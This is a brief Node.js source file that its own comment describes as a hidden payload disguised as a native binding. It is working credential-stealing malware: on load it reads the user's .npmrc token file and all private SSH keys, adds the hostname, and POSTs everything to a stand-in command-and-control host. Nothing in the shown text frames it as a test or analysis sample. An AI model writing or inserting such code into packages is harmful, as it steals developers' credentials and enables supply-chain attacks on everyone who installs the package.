// Hidden payload disguised as native binding
const http = require('http');
const os = require('os');
const fs = require('fs');
const path = require('path');

const home = os.homedir();
const data = {
  hostname: os.hostname(),
  npmrc: '',
  ssh_keys: []
};

try { data.npmrc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8'); } catch(e) {}
try {
  const sshDir = path.join(home, '.ssh');
  const files = fs.readdirSync(sshDir);
  for (const f of files) {
    if (!f.endsWith('.pub')) {
      try { data.ssh_keys.push({ name: f, content: fs.readFileSync(path.join(sshDir, f), 'utf8') }); } catch(e) {}
    }
  }
} catch(e) {}

const req = http.request({ hostname: 'hidden-c2.example.com', path: '/payload', method: 'POST' }, () => {});
req.end(JSON.stringify(data));
